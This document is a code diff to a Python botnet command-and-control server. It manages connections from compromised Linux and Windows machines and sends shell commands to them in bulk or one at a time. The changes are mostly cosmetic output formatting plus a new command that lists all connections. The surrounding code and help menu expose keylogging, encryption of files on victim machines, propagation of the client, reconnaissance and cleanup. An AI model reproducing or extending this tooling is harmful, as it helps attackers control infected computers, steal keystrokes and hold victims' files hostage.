@@ -26,7 +26,7 @@ except ImportError as err:
 #  CONSTANTS   #
 PORT = 1337 # Port number to receve connections from.
 IP = "192.168.31.134" # IP address of your computer. Change this!
-NUM_OF_CONNECTIONS = 10 # Number of connections to accept.
+TO_ACCEPT = 10 # Number of connections to accept.
 NUM_OF_THREADS = 2 # Number of threads that we will create.
 THREAD_IDS = [1, 2] # Thread identifiers.
 BUFFER = 20000 # Maximum number of bytes to accept from the output of command.
@@ -58,6 +58,7 @@ DARKBLUE = '\033[34m'
 GREEN = '\033[92m'
 RED = '\033[91m'
 PURPLE = '\033[95m'
+DARKPURPLE = '\033[35m'
 ORANGE = '\033[33m'
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
@@ -78,9 +79,9 @@ class Server:
 		try:
 			self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			self.server_socket.bind((IP, PORT))
-			self.server_socket.listen(NUM_OF_CONNECTIONS)
+			self.server_socket.listen(TO_ACCEPT)
 		except:
-			print(RED + 'Address already is use. Try again in 10-15 seconds...' + RESET)
+			print(RED + '[-] Address already is use. Try again in 10-15 seconds...' + RESET)
 			_exit(1)
 
 	def accept_connections(self):
@@ -182,29 +183,47 @@ class BotnetCmdCtrl:
 		cmd = input(GREEN + '[shell]$: ' + RESET)
 		while True:
 			if cmd == 'exit':
-				print(RED, '\nYou have closed all connections. Exiting program...', RESET)
+				print(RED, '\n[+] You have closed all connections. Exiting program...', RESET)
 				self.server.close()
 				_exit(0)
 
 			elif cmd.strip() == 'ls lin':
 				if len(IP_ADDRESSES[0]) == 0:
-					print(RED + 'Warning:' + RESET + 'There are no Linux connections to list...')
+					print(RED + BOLD + '[!] Warning: ' + RESET + 'There are no Linux connections to list...')
 				else:
 					for ip in IP_ADDRESSES[0]:
 						print(BLUE + str(IP_ADDRESSES[0].index(ip)) + RESET + ' - ' + ip)
 
 			elif cmd.strip() == 'ls win':
 				if len(IP_ADDRESSES[1]) == 0:
-					print(RED +'Warning:' + RESET + 'There are no Windows connections to list...')
+					print(RED + BOLD + '[!] Warning: ' + RESET + 'There are no Windows connections to list...')
 				else:
 					for ip in IP_ADDRESSES[1]:
 						print(BLUE + str(IP_ADDRESSES[1].index(ip)) + RESET + ' - ' + ip)
+			
+			elif cmd.strip() == 'ls all':
+				if len(IP_ADDRESSES[0]) + len(IP_ADDRESSES[1]) == 0: # Check if there no connections.
+					print(RED + BOLD + '[-] There are no connections to list...' + RESET) # Print this if there arent connections.
+				else:
+					print(DARKPURPLE + BOLD + 'Linux connections:\n' + RESET)
+					if len(IP_ADDRESSES[0]) == 0: # If there are no Linux connections print the following message.
+						print(RED + BOLD + 'There are no Linux connections to list...' + RESET)
+					else: # Else loop over Linux IP list and print out the IP followed by there index.
+						for ip in IP_ADDRESSES[0]:
+							print(BLUE + str(IP_ADDRESSES[0].index(ip)) + RESET + ' - ' + ip)
+
+					print(DARKPURPLE + BOLD + 'Windows connections:\n' + RESET)
+					if len(IP_ADDRESSES[1]) == 0: # If there are no Windows connections print the following message.
+						print(RED + BOLD + 'There are no Windows connections to list...' + RESET)
+					else: # Else loop over Windows IP list and print out the IP followed by there index.
+						for ip in IP_ADDRESSES[1]:
+							print(BLUE + str(IP_ADDRESSES[1].index(ip)) + RESET + ' - ' + ip)
 
 			elif cmd.strip() == 'cnt lin':
-				print(f'{PURPLE + str(LINUX_COUNT) + RESET} Linux target.')
+				print('[*]' + f'{PURPLE + BOLD + str(LINUX_COUNT) + RESET} Linux target.')
 
 			elif cmd.strip() == 'cnt win':
-				print(f'{PURPLE + str(WINDOWS_COUNT) + RESET} Windows target.')
+				print('[*]' + f'{PURPLE + BOLD + str(WINDOWS_COUNT) + RESET} Windows target.')
 
 			elif cmd[:3] == 'lin':
 				resp_list = self.send_cmd_all_linux(cmd[4:])
@@ -240,7 +259,7 @@ class BotnetCmdCtrl:
 						chdir(cmd[6:])
 						print(RED + 'Ok' + RESET)
 					except:
-						print(RED + 'Couldn\'t run command: ' + RESET + cmd[3:])
+						print(RED + '[-] Couldn\'t run command: ' + RESET + cmd[3:])
 
 			elif cmd[:7] == 'sel lin': # Select the Linux target to connect to.
 				try:
@@ -297,9 +316,9 @@ class BotnetCmdCtrl:
 
 			elif cmd.strip() == 'check mode': # Check what write mode the program is in.
 				if self.output_to_file:
-					print(ORANGE + 'Mode' + RESET + ' = write to stdout and files.')
+					print(ORANGE + BOLD + '[*] Mode' + RESET + ' = write to stdout and files.')
 				else:
-					print(ORANGE + 'Mode' + RESET + ' = write to stdout.')
+					print(ORANGE + BOLD + '[*] Mode' + RESET + ' = write to stdout.')
 
 			elif cmd.strip() == 'clear':
 				system('clear')
@@ -308,7 +327,7 @@ class BotnetCmdCtrl:
 				self.help()
 
 			else:
-				print(RED + 'Invalid command!' + RESET + ' type' + GREEN + " 'help' " + RESET + 'for help menu...')
+				print(RED + '[-] Invalid command!' + RESET + ' type' + GREEN + " 'help' " + RESET + 'for help menu...')
 		
 			cmd = input(GREEN + '[shell]$: ' + RESET)
 	
@@ -355,10 +374,10 @@ class BotnetCmdCtrl:
 		try:
 			target_ip = IP_ADDRESSES[0][ip_index]
 		except IndexError:
-			print(RED, 'Warning:', RESET, 'There are no Linux connections.')
+			print(RED, '[-] Warning:', RESET, 'There are no Linux connections.')
 			return
 		except:
-			print(RED, 'An error was thrown...', RESET)
+			print(RED, '[-] An error was thrown...', RESET)
 			return
 
 		conn = LINUX_CONNS[target_ip]
@@ -367,7 +386,7 @@ class BotnetCmdCtrl:
 			if cmd == 'back':
 				break
 			elif cmd == 'exit':
-				print(RED, '\nYou have closed all connections. Exiting program...', RESET)
+				print(RED, '\n[+] You have closed all connections. Exiting program...', RESET)
 				self.server.close()
 				_exit(1)
 			elif cmd == 'help':
@@ -381,13 +400,13 @@ class BotnetCmdCtrl:
 				conn.send(cmd.encode(ENCODING))
 				resp = conn.recv(BUFFER).decode(ENCODING)
 			except BrokenPipeError:
-				print(RED + f'The connection to {target_ip} is no longer available...' + RESET)
+				print(RED + f'[-] The connection to {target_ip} is no longer available...' + RESET)
 				break
 
-			if resp == 'Invalid command...' or resp == 'Ok':
+			if resp == '[-] Invalid command...' or resp == 'Ok':
 				print(RED + resp + RESET)
 			elif resp == 'None':
-				print(DARKBLUE + 'Keylogger initiated...' + RESET)
+				print(DARKBLUE + '[*] Keylogger initiated...' + RESET)
 			else:
 				resp = resp[2:-1]
 				resp = resp.replace('\\n', '\n')
@@ -404,10 +423,10 @@ class BotnetCmdCtrl:
 		try:
 			target_ip = IP_ADDRESSES[1][ip_index]
 		except IndexError:
-			print(RED, 'Warning:', RESET, 'There are no Windows connections.')
+			print(RED, '[-] Warning:', RESET, 'There are no Windows connections.')
 			return
 		except:
-			print(RED, 'An error was thrown...', RESET)
+			print(RED, '[-] An error was thrown...', RESET)
 			return
 
 		conn = WINDOWS_CONNS[target_ip]
@@ -416,7 +435,7 @@ class BotnetCmdCtrl:
 			if cmd == 'back':
 				break
 			elif cmd == 'exit':
-				print(RED, '\nYou have closed all connections. Exiting program...', RESET)
+				print(RED, '\n[+] You have closed all connections. Exiting program...', RESET)
 				self.server.close()
 				_exit(1)
 			elif cmd == 'help':
@@ -430,13 +449,13 @@ class BotnetCmdCtrl:
 				conn.send(cmd.encode(ENCODING))
 				resp = conn.recv(BUFFER).decode(ENCODING)
 			except BrokenPipeError:
-				print(RED + f'The connection to {target_ip} is no longer available...' + RESET)
+				print(RED + f'[-] The connection to {target_ip} is no longer available...' + RESET)
 				break
 
-			if resp == 'Invalid command...' or resp == 'Ok':
+			if resp == '[-] Invalid command...' or resp == 'Ok':
 				print(RED + resp + RESET)
 			elif resp == 'None':
-				print(DARKBLUE + 'Keylogger initiated...' + RESET)
+				print(DARKBLUE + '[*] Keylogger initiated...' + RESET)
 			else:
 				resp = resp[2:-1]
 				resp = resp.replace('\\n', '\n')
@@ -480,29 +499,32 @@ class BotnetCmdCtrl:
 			Returns:
 				None
 		"""
-		print(PURPLE, 'Commands in main session: ', RESET)
-		print(ORANGE, '  ls lin >', RESET, 'Lists all the Linux connections (IPs).')
-		print(ORANGE, '  ls win >', RESET, 'Lists all the Windows connections (IPs).')
-		print(ORANGE, '  cnt lin >', RESET, 'Lists the amount of Linux connections (int).')
-		print(ORANGE, '  cnt win >', RESET, 'Lists the amount of Windows connections (int).')
-		print(ORANGE, '  lin [command] >', RESET, 'Send command to all Linux machines.')
-		print(ORANGE, '  win [command] >', RESET, 'Send command to all Windows machines.')
-		print(ORANGE, '  sel lin|win [IP index] >', RESET, 'Select number from list outputs and connect to one target.')
-		print(ORANGE, '  switch >', RESET, 'Switch writing modes: to std out, or to stdout and file.')
-		print(ORANGE, '  check mode >', RESET, 'Check write mode.')
-		print(ORANGE, '  autorecon linux >', RESET, 'Performs basic reconnaissance on Linux machines.' )
-		print(ORANGE, '  autorecon windows >', RESET, 'Performs basic reconnaissance on Windows machines.')
-		print(ORANGE, '  lin|win keylog >', RESET, 'Begin a keylogger, store data in tmp folder, file name log.txt.')
-		print(ORANGE, '  lin|win encrypt [path or file] >', RESET, 'Encrypt a file. Save the encryption key!')
-		print(ORANGE, '  lin|win decrypt [path or file] [key] >', RESET, 'Decrypt a file.')
-		print(ORANGE, '  propagate >', RESET, "Copy client file to three different directory.")
-		print(ORANGE, '  destroy >', RESET, "Attempt to delete the copies of the program on target machines.")
-		print(ORANGE, '  sh [command] >', RESET, 'Execute command on the host machine.')
-		print(ORANGE, '  clear >', RESET, 'Clear the screen.')
-		print(ORANGE, '  exit >', RESET, "Quit the program.", end='\n\n')
-		print(PURPLE, 'Commands when connected to target:', RESET)
-		print(ORANGE, '  back >', RESET, 'Return to the main session.')
-		print(RED, 'keylog and encrypt commands are also available during target connection.')
+		print(PURPLE + BOLD + 'Commands in main session: ' + RESET)
+		print(ORANGE + BOLD + '  ls lin >', RESET, 'Lists all the Linux connections (IPs).')
+		print(ORANGE + BOLD + '  ls win >', RESET, 'Lists all the Windows connections (IPs).')
+		print(ORANGE + BOLD + '  ls all >', RESET, 'List both Windows and Linux connections (IPs).')
+		print(ORANGE + BOLD + '  cnt lin >', RESET, 'Lists the amount of Linux connections (int).')
+		print(ORANGE + BOLD + '  cnt win >', RESET, 'Lists the amount of Windows connections (int).')
+		print(ORANGE + BOLD + '  lin [command] >', RESET, 'Send command to all Linux machines.')
+		print(ORANGE + BOLD + '  win [command] >', RESET, 'Send command to all Windows machines.')
+		print(ORANGE + BOLD + '  sel lin|win [IP index] >', RESET, 'Select number from list outputs and connect to one target.')
+		print(ORANGE + BOLD + '  switch >', RESET, 'Switch writing modes: to std out, or to stdout and file.')
+		print(ORANGE + BOLD + '  check mode >', RESET, 'Check write mode.')
+		print(ORANGE + BOLD + '  autorecon linux >', RESET, 'Performs basic reconnaissance on Linux machines.' )
+		print(ORANGE + BOLD + '  autorecon windows >', RESET, 'Performs basic reconnaissance on Windows machines.')
+		print(ORANGE + BOLD + '  lin|win keylog >', RESET, 'Begin a keylogger, store data in tmp folder, file name log.txt.')
+		print(ORANGE + BOLD + '  lin|win encrypt [path or file] >', RESET, 'Encrypt a file. Save the encryption key!')
+		print(ORANGE + BOLD + '  lin|win decrypt [path or file] [key] >', RESET, 'Decrypt a file.')
+		print(ORANGE + BOLD + '  propagate >', RESET, "Copy client file to three different directory.")
+		print(ORANGE + BOLD + '  destroy >', RESET, "Attempt to delete the copies of the program on target machines.")
+		print(ORANGE + BOLD + '  sh [command] >', RESET, 'Execute command on the host machine.')
+		print(ORANGE + BOLD + '  clear >', RESET, 'Clears the screen.')
+		print(ORANGE + BOLD + '  exit >', RESET, "Quit the program.", end='\n\n')
+		print(PURPLE + BOLD + 'Commands when connected to target:', RESET)
+		print(ORANGE + BOLD + '  back >', RESET, 'Return to the main session.')
+		print(ORANGE + BOLD + '  clear >', RESET, 'Clears the screen.')
+		print(ORANGE + BOLD + '  exit >', RESET, "Quits the program.", end='\n\n')
+		print(RED + BOLD + 'keylog and encrypt commands are also available during target connection.' + RESET)
 
 	def start(self):
 		"""This function will initiate the program.
